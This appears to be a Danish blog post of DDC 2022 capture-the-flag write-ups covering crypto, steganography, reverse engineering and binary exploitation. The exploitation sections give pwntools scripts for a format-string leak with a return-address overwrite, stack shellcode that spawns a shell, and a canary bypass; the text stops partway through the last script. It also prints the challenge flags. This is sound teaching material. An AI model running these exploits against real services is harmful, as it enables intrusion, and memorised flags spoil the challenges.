@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<title>DDC2022: Writeups | </title>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.80.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cavetownie.github.io/css/index.css">
+<link rel="canonical" href="https://cavetownie.github.io/posts/ddc2022writeups/">
+<link rel="alternate" type="application/rss+xml" href="" title="">
+
+<header>
+  
+    <a href="https://cavetownie.github.io/" class="title"></a>
+  
+  
+    <nav>
+    
+      <a href="/">Blog</a>
+    
+      <a href="/about/">About</a>
+    
+      <a href="/challenges/">Challenges</a>
+    
+      <a href="/index.xml">RSS</a>
+    
+    </nav>
+  
+</header>
+
+<article>
+  <header>
+    <h1>DDC2022: Writeups</h1>
+    <time datetime="2022-04-09T22:00:00&#43;02:00">April 09, 2022</time>
+  </header>
+  <h1 id="permutation---cryptography">Permutation - Cryptography</h1>
+<p>I kryptoopgaven &ldquo;Permutation&rdquo; får vi givet to ting. Et python-script som &ldquo;krypterer&rdquo; noget tekst den læser fra en fil.
+Denne fil har vi ikke til rådighed, da flaget ligger heri. Den bruger random i python og bruger en funktion der hedder
+&ldquo;random.shuffle()&rdquo;. Vi får også en fil, som har noget krypteret tekst i sig:</p>
+<pre><code> re3o ot iegntirt  l,iuvfrmuneau  crC0e tWD3etl cr, veteap0p,mepuDsoctyip2 i w gs!DD2ere!Coanmtirgol!rtpn dim! s7s1ei_rse:ct'neonetyi  osffh sm t2} _nmWhu ohrc3  l3,herhedimCupo!sra4@al {sFo x tri
+</code></pre><p>Flaget ligger heri. En måde hvorpå man kan løse denne opgave er ved at indse, at man ved at shuffle et input med given længde X, altid vil få karakterne til at flytte på samme måde (ved et konstant seed). F.eks.</p>
+<pre><code>XAAAAAAA
+-&gt; Shuffle -&gt;
+AAAAXAAA
+</code></pre><p>Med den viden kan vi bruteforce opgaven. Da indekset af X i et payload bestående af A&rsquo;er med samme længde. Vil blive flyttet til den krypterede karakters spot, derfor laver vi nu en masse små payloads som ser ud på følgende måde:</p>
+<pre><code>XAAA
+AXAA
+AAXA
+AAAX
+</code></pre><p>Dette kræver lidt programmeringssnilde:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> random
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">replacer</span>(s, newstring, index):
+    <span style="color:#75715e"># if not erroring, but the index is still not in the correct range..</span>
+    <span style="color:#66d9ef">if</span> index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:  <span style="color:#75715e"># add it to the beginning</span>
+        <span style="color:#66d9ef">return</span> newstring <span style="color:#f92672">+</span> s
+    <span style="color:#66d9ef">if</span> index <span style="color:#f92672">&gt;</span> len(s):  <span style="color:#75715e"># add it to the end</span>
+        <span style="color:#66d9ef">return</span> s <span style="color:#f92672">+</span> newstring
+
+    <span style="color:#75715e"># insert the new string between &#34;slices&#34; of the original</span>
+    <span style="color:#66d9ef">return</span> s[:index] <span style="color:#f92672">+</span> newstring <span style="color:#f92672">+</span> s[index <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>:]
+
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;encrypted.enc&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+    enc <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+
+<span style="color:#75715e">#haha x marks the spot</span>
+
+indx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+yes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> enc:
+    plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">196</span>
+    plaintext <span style="color:#f92672">=</span> replacer(plaintext, <span style="color:#e6db74">&#34;X&#34;</span>, indx)
+    random<span style="color:#f92672">.</span>seed(<span style="color:#e6db74">&#34;Crypto Gang&#34;</span>)
+    
+    l <span style="color:#f92672">=</span> [c <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> plaintext]
+    
+    random<span style="color:#f92672">.</span>shuffle(l)
+    random<span style="color:#f92672">.</span>shuffle(l)
+    random<span style="color:#f92672">.</span>shuffle(l)
+    spot <span style="color:#f92672">=</span> (l<span style="color:#f92672">.</span>index(<span style="color:#e6db74">&#34;X&#34;</span>))
+    yes <span style="color:#f92672">+=</span> (enc[spot])
+    
+    ciphertext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(l)
+    indx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+
+<span style="color:#66d9ef">print</span>(yes)
+</code></pre></div><p>Er der en nemmere måde? Sikkert!</p>
+<pre><code>Welcome to Crypto @ DDC 2022!!! We have 0x1337 primes, the most elliptical of curves, deterministic signatures, ciphers and more! For now, here's your first flag: DDC{unp3rmuting_the_p3rmut4tion!}
+</code></pre><h1 id="space-beats---forensics">Space Beats - Forensics</h1>
+<p>Vi får en .wav fil, samt en opgavebeskrivelse der hinter til at de har tjekket alle bits undtagen de mindst signifikante. Dette leder os på sporet af &ldquo;LSB&rdquo;, jeg googlede bare efter et værktøj og med <a href="https://github.com/ragibson/Steganography">https://github.com/ragibson/Steganography</a>
+Kørte jeg one-lineren:</p>
+<pre><code>$ stegolsb wavsteg -r -i sound_steg.wav -o output.txt -n 2 -b 5589889
+</code></pre><p>Dermed flag:</p>
+<pre><code>DDC{UFO_guy_i5_r1ght_w3_4r3_0ut_h3r3_m4n}
+</code></pre><h1 id="hangry-for-flags---omvendt-ingeniørkunst">Hangry for flags - Omvendt ingeniørkunst</h1>
+<p>Den her er lidt værre at skulle forklare, da den er sådan lidt halv-vanskellig uden billeder osv, men det er jeg for
+doven til. Jeg åbnede filen i Binary Ninja (sponsorer mig):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ae81ff">000012</span>d9      <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>data_4020, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x12</span>)
+<span style="color:#ae81ff">000012</span>ea      printf(format: <span style="color:#e6db74">&#34;Enter the password: &#34;</span>)
+<span style="color:#ae81ff">00001302</span>      __isoc99_scanf(format: <span style="color:#e6db74">&#34;%17s&#34;</span>, <span style="color:#f92672">&amp;</span>data_4020)
+<span style="color:#ae81ff">0000134f</span>      <span style="color:#66d9ef">for</span> (int32_t var_c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; var_c s<span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x10</span>; var_c <span style="color:#f92672">=</span> var_c <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+<span style="color:#ae81ff">00001344</span>          <span style="color:#f92672">*</span>(sx.q(var_c) <span style="color:#f92672">+</span> <span style="color:#f92672">&amp;</span>data_4020) <span style="color:#f92672">=</span> sub_11c9(sx.d(<span style="color:#f92672">*</span>(sx.q(var_c) <span style="color:#f92672">+</span> <span style="color:#f92672">&amp;</span>data_4020)), <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> var_c)
+<span style="color:#ae81ff">00001364</span>      <span style="color:#66d9ef">if</span> (sub_1226(<span style="color:#f92672">&amp;</span>data_4020, <span style="color:#ae81ff">0x11</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+<span style="color:#ae81ff">0000137</span>b          puts(str: <span style="color:#e6db74">&#34;Good Job.&#34;</span>)
+<span style="color:#ae81ff">0000136</span>d      <span style="color:#66d9ef">else</span>
+<span style="color:#ae81ff">0000136</span>d          puts(str: <span style="color:#e6db74">&#34;Try again.&#34;</span>)
+<span style="color:#ae81ff">000013</span><span style="color:#ae81ff">86</span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</code></pre></div><p>Og kan se at her på 1302, bliver skannet et password på 17 karakterer ind i en buffer i data4020. Vores password
+skal altså være 17 i længde. Det kan vi jo ikke bruteforce, der er alllt for mange kombinationer. Så derfor må
+vi finde ud af hvordan den her algoritme fungerer. Vi kan se at der er et kald til funktionen &ldquo;sub_11c9&rdquo; som ser ud
+på følgende måde:</p>
+<pre><code>000011e5      if (arg1 s&gt; 0x3f &amp;&amp; arg1 s&lt;= 0x5f)
+0000120d          int32_t rdx_1 = arg1 - 0x40 + (arg2 &lt;&lt; 3) - arg2
+00001215          uint32_t rax_6 = rdx_1 s&gt;&gt; 0x1f u&gt;&gt; 0x1b
+00001225          return zx.q(((rdx_1 + rax_6) &amp; 0x1f) - rax_6 + 0x40)
+000011ee      puts(str: &quot;Try again.&quot;)
+000011f8      exit(status: 1)
+000011f8      noreturn
+</code></pre><p>Her sker en masse ting, men det er vi egentligt lidt ligeglade med, hvis vi kan få den til at spytte samme output ud.
+Jeg smed det over i python og sikrede ved dynamisk analyse (dvs. med gdb) at outputtet var ens med mit python script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># haha funky kode</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enc</span>(arg1, arg2):
+    <span style="color:#66d9ef">try</span>:
+        arg1 <span style="color:#f92672">=</span> ord(arg1)
+        <span style="color:#66d9ef">if</span> arg1 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x3f</span> <span style="color:#f92672">and</span> arg1 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x5f</span>:
+            op1 <span style="color:#f92672">=</span> (arg1<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>) <span style="color:#f92672">+</span> ((arg2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">-</span> arg2)
+            op2 <span style="color:#f92672">=</span> ((op1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x1f</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x1b</span>)
+            <span style="color:#66d9ef">return</span> (((op1<span style="color:#f92672">+</span>op2)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x1f</span>) <span style="color:#f92672">-</span> op2)<span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">pass</span>
+</code></pre></div><p>Men, så skal vi jo også vide hvordan outputtet skal se ud! Der ligger heldigvis en streng i binarien der hedder
+&ldquo;COME_JOIN_REVGANG&rdquo;, den er også 17 lang, så mon ikke det er den.</p>
+<p>Vi skriver lidt kode til at gøre det for os. (Grim kode advarsel)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> string
+
+asc <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>printable
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;COME_JOIN_REVGANG&#34;</span>
+cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+passwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enc</span>(arg1, arg2):
+    <span style="color:#66d9ef">try</span>:
+        arg1 <span style="color:#f92672">=</span> ord(arg1)
+        <span style="color:#66d9ef">if</span> arg1 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x3f</span> <span style="color:#f92672">and</span> arg1 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x5f</span>:
+            op1 <span style="color:#f92672">=</span> (arg1<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>) <span style="color:#f92672">+</span> ((arg2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">-</span> arg2)
+            op2 <span style="color:#f92672">=</span> ((op1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x1f</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x1b</span>)
+            <span style="color:#66d9ef">return</span> (((op1<span style="color:#f92672">+</span>op2)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x1f</span>) <span style="color:#f92672">-</span> op2)<span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">pass</span>
+
+<span style="color:#75715e">#print(chr(enc(&#34;S&#34;, 16)))</span>
+cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+val <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag:
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> asc:
+        <span style="color:#66d9ef">try</span>:
+            <span style="color:#66d9ef">if</span> chr(enc(i, val)) <span style="color:#f92672">==</span> flag[cnt]:
+                passwd <span style="color:#f92672">+=</span> (i)
+                cnt <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+                val <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
+        <span style="color:#66d9ef">except</span>:
+            <span style="color:#66d9ef">pass</span>
+
+<span style="color:#66d9ef">print</span>(passwd)
+<span style="color:#75715e"># DDC{SFKJK]IJVNHBZRSGG} - skal sendes uden DDC for at tjekke</span>
+</code></pre></div><h1 id="babyheap---binary-exploitation">Babyheap - Binary exploitation</h1>
+<p>Øhh.. ja&hellip;</p>
+<pre><code>Index?
+1
+1. malloc
+2. free
+3. read
+4. write
+
+1
+Index?
+2
+1. malloc
+2. free
+3. read
+4. write
+
+1
+Index?
+3
+1. malloc
+2. free
+3. read
+4. write
+
+1
+Index?
+4
+1. malloc
+2. free
+3. read
+4. write
+
+1
+Index?
+5
+1. malloc
+2. free
+3. read
+4. write
+
+3
+Index?
+1
+result: DDC{Probably_tchache_poisoning_ez_pz}
+1. malloc
+</code></pre><p>Jeg ved det heller ikke.</p>
+<h1 id="aslrlogin---binary-exploitation">aslrLogin - Binary exploitation</h1>
+<p>ASLR login er en opgave der omhandler ASLR. ASLR står for &ldquo;Address Space Layout Randomization&rdquo;, og sørger for at addresserne i en binær
+er tilfældige (sådan delvist da, den omrokerer ikke på kodeaddresser, men f.eks. sørger for at dynamisk hukommelse loades forskelligt)
+Her har de været så utroligt flinke at give os kildekoden! Den har jeg kommenteret under:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// $ gcc aslr.c -o  aslrLogin
+</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>; <span style="color:#75715e">// Et meget stort nummer, gad vide hvorfor?
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">checkPassword</span>()
+{
+        <span style="color:#66d9ef">char</span> password[<span style="color:#ae81ff">20</span>];
+
+        printf(<span style="color:#e6db74">&#34;Enter your password:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    fflush(stdin); 
+        scanf(<span style="color:#e6db74">&#34;%[^</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">]&#34;</span>, password); <span style="color:#75715e">// Her bliver vi bedt om password, indtil vi sender en newline / trykker enter
+</span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;You entered: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, password); <span style="color:#75715e">// Den printer ikke direkte, men med en %s!
+</span><span style="color:#75715e"></span>}
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">secretFunction</span>() 
+{
+        printf(<span style="color:#e6db74">&#34;you succesfuly logged in</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+     FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>); <span style="color:#75715e">// Den åbner flaget!
+</span><span style="color:#75715e"></span>   <span style="color:#66d9ef">if</span>(f <span style="color:#f92672">==</span> NULL){
+    printf(<span style="color:#e6db74">&#34;flag not found: please run this on the server</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    } <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>];
+    fgets(buf, <span style="color:#ae81ff">63</span>, f);
+    printf(<span style="color:#e6db74">&#34;You were able to log in, and your flag is: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
+    }
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+    <span style="color:#66d9ef">char</span> username[<span style="color:#ae81ff">20</span>];
+    printf(<span style="color:#e6db74">&#34;Enter your username:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    fflush(stdin);
+    fgets(username, <span style="color:#ae81ff">20</span>, stdin);
+
+        printf(username ,<span style="color:#f92672">&amp;</span>n); <span style="color:#75715e">// Her printer den vores input, uden at tjekke noget! Man kan så lave formatstring!
+</span><span style="color:#75715e"></span>        checkPassword();
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Der er to vigtige takeaways i denne opgave, det første er at når man vælger at skanne input, uden at verificere længden kan man ødelægge
+stacken. (Læs evt. <a href="https://github.com/rootkiter/phrack/blob/master/phrack49/14.txt)">https://github.com/rootkiter/phrack/blob/master/phrack49/14.txt)</a>. Det andet er, at der jo er pokkers ASLR på. Så vi
+ved ikke rigtigt hvor ting ligger, og det er sgu irriterende! Men vi ved vel hvor koden ligger? NEJ, det gør vi faktisk heller ikke, da
+den også har &ldquo;PIE&rdquo; på. Dette er Position-Independent Executable og flytter rundt på .text segmentet (hvor koden ligger). Man kan finde
+ud af hvilke protections der har ved at bruge pwntools funktionen checksec. Anyways. Long story short, så kan man bruge format string
+til at leake addresser fra memory og derefter udregne offsets. Hvis man aldrig har lavet pwn før, er det måske lidt en lang forklaring
+så den får i ikke her! Men jeg har posts her på siden om format strings osv. for sig selv!:) Vi sender nu en masse A&rsquo;ere indtil vi
+overwriter stackpointeren ved retur instruktionen og så sætter vi stackpointeren til at være den der hemmelige funktion. Så får vi flag!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;aslrLogin.hkn&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9000</span>
+
+elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(f<span style="color:#e6db74">&#34;./{fname}&#34;</span>)
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;new-window&#34;</span>]
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting, binary<span style="color:#f92672">=</span>elf)  
+
+gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+mode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;remote&#34;</span>
+<span style="color:#66d9ef">if</span> mode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;remote&#34;</span>:
+    io <span style="color:#f92672">=</span> remote(ip, port)
+
+point <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">&#34;kaaa&#34;</span>, endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;little&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>():
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recvline())
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%15$p&#34;</span>)
+    leak <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split()[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">116</span>
+    <span style="color:#66d9ef">print</span>(hex(leak))
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>point<span style="color:#f92672">+</span>p64(leak))
+    
+    
+    io<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    pwn()
+<span style="color:#75715e"># You were able to log in, and your flag is: DDC{QX2kxFn5yv}</span>
+</code></pre></div><h1 id="ebofbabybof-kan-ikke-huske-hvad-den-hedder---binary-exploitation">ebof/babybof (kan ikke huske hvad den hedder) - Binary exploitation</h1>
+<p>Vi får den spændende funktion som hedder vulnerable. Den tillader os at overwrite return, da var_38
+er en void, og vi læser 0x80 ind i den. Alt for møøøj.</p>
+<pre><code>00401160  {
+0040117d      void var_38;
+0040117d      return read(0, &amp;var_38, 0x80);
+0040116e  }
+</code></pre><p>Dog virker det ikke til at vi bare har normalt ROP, fordi vi kan kun overwrite en returaddresse.
+Vi har altså ikke mega meget magt. Vi får dog givet en anden spændende funktion som hedder:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ae81ff">00401150</span>  <span style="color:#ae81ff">55</span>                 push    rbp {var_8}
+<span style="color:#ae81ff">00401151</span>  <span style="color:#ae81ff">4889e5</span>             mov     rbp, rsp {var_8}
+<span style="color:#ae81ff">00401154</span>  ffe4               jmp     rsp {var_8}
+</code></pre></div><p>Dette tillader os at manipulere med stackpointeren, som vi ved har betydning for instruktionerne der bliver kørt. Men vi vil ikke bare til stackpointeren, vi vil rigtigt gerne til et stykke før den, fordi der ligger resten af vores input. Vi kan bruge <code>vmmap</code> i pwntools, og derefter
+se, at stacken er executable. Vi kan derfor skrive shellcode til stacken og hoppe til det. Fedt! Så vi skal skrive noget custom shellcode, der flytter stackpointeren ned ad og derefter kalder return, så RIP blir sat til RSP. Jeg bruger (<a href="https://defuse.ca/online-x86-assembler.htm)">https://defuse.ca/online-x86-assembler.htm)</a>. Vi laver shellcoden som hedder:</p>
+<pre><code>0:  48 83 ec 38             sub    rsp,0x38
+4:  ff e4                   jmp    rsp
+</code></pre><p>Da denne er mindre end 8 bytes. Vi subtracter stackpointeren 0x38, hvilket svarer til 56. Vi skal derfor ca. så meget tilbage. Her legede jeg lidt manuelt med dynamisk, fordi jeg prøvede at go fast, for at få point andre steder. Til sidst fandt jeg det gyldne offset. Vi skal nu bruge noget shellcode til at køre execve(&quot;/bin/sh&quot;), her bruger jeg oftest pwntools. Og sådan er der flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;bbbof.hkn&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>
+
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;new-window&#34;</span>]
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting, binary<span style="color:#f92672">=</span>elf)  
+
+
+gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+mode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;remote&#34;</span>
+
+<span style="color:#66d9ef">if</span> mode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;remote&#34;</span>:
+    io <span style="color:#f92672">=</span> remote(ip, port)
+
+
+point <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">&#34;oaaa&#34;</span>, endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;little&#34;</span>)
+pay <span style="color:#f92672">=</span> asm(pwnlib<span style="color:#f92672">.</span>shellcraft<span style="color:#f92672">.</span>amd64<span style="color:#f92672">.</span>linux<span style="color:#f92672">.</span>sh())
+shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x83\xEC\x38\xFF\xE4\x00\x00</span><span style="color:#e6db74">&#34;</span>
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(point<span style="color:#f92672">-</span><span style="color:#ae81ff">58</span>)<span style="color:#f92672">+</span>pay<span style="color:#f92672">+</span>shellcode
+addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401150</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>():
+    io<span style="color:#f92672">.</span>sendline(padding<span style="color:#f92672">+</span>p64(addr))
+
+    io<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    pwn()
+
+<span style="color:#75715e"># DDC{Smashing_The_Stack_For_Fun_And_Profit}</span>
+</code></pre></div><h1 id="canaries---binary-exploitation">Canaries - Binary exploitation</h1>
+<p>Pyhh det er en lang speedrun af writeups det her. Vi er næsten ved vejs ende. Den her opgave
+er lidt svær at forklare (uden at bruge for meget tid) så jeg skal gøre mit bedste. Stack canaries er opkaldt efter en gammel metode minefolk plejede at benytte. De tog en kanariefugl med ned i minerne, fordi den ville besvime af oxygenmangel eller carbonmonoxid eller et eller andet forgiftelses fis, før menneskerne. Øv fugl. Det var derfor en sikkerhedsmekanisme for minerne. Den er blevet implementeret som sikkerhedsmekanisme i moderne executables as well. Den tjekker bare om stacken er blevet leget med, og hvis den er det, så går den i smadder og exiter inden man når at få shell!</p>
+<pre><code>00401592  488b4df8           mov     rcx, qword [rbp-0x8 {var_10}]
+00401596  6448330c25280000…  xor     rcx, qword [fs:0x28]
+0040159f  7405               je      0x4015a6
+004015a1  e80afcffff         call    __stack_chk_fail
+</code></pre><p>Specifikt tales der om koden her. Ved at lege lidt med filen finder man ud af at man kan sende inputtet &ldquo;272&rdquo; som længde af ens brugernavn og derefter er de sidste 8 bytes canarien! Magisk ikke? Jo. Fedt. Episk. Det kan man se i værktøjet Ida, ved at kigge på følgende layout:</p>
+<pre><code>int v4; // [rsp+Ch] [rbp-114h] BYREF
+char buf[264]; // [rsp+10h] [rbp-110h] BYREF
+unsigned __int64 v6; // [rsp+118h] [rbp-8h]
+
+v6 = __readfsqword(0x28u);
+</code></pre><p>v6 bliver sat lige efter en buffer på 264. v6 er en integer. en integer er 8 bytes i størrelse.
+264+8=272. Badabing. Så leaker man v6. Den dersens qword read funktion, det er der canarien
+bliver loadet ind. Da der ikke er PIE her, og der igen er en &ldquo;win&rdquo; funktion som giver flag. Så
+overwriter vi canarien med den leakede canary værdi, så brokker den sig ikke og så kan vi få flag!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;canaries.hkn&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>
+
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;new-window&#34;</span>]
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting, binary<span style="color:#f92672">=</span>elf)  
+
+gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+mode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;remote&#34;</span>
+
+<span style="color:#66d9ef">if</span> mode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;remote&#34;</span>:
+    io <span style="color:#f92672">=</span> remote(ip, port)
+
